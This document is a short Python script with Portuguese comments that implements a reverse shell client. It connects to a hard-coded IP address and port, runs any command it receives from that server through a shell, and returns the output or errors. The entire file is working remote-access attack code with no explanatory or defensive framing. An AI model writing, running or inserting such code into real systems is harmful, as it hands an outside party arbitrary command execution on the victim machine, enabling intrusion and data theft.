import socket
import os
import subprocess

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('10.137.73.36', 6783))  # Conectando ao servidor

while True:
    resposta = client_socket.recv(1024).decode()
    try:
        # Executa o comando e captura a saída
        processo = subprocess.Popen(resposta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        saida, erro = processo.communicate()
        
        # Envia a saída ou erro de volta ao servidor
        if saida:
            client_socket.sendall(saida.encode())
        elif erro:
            client_socket.sendall(erro.encode())
        else:
            client_socket.sendall("Comando executado sem saída.".encode())
    
    except Exception as e:
        client_socket.sendall(f"Erro ao executar o comando: {str(e)}".encode())


client_socket.close()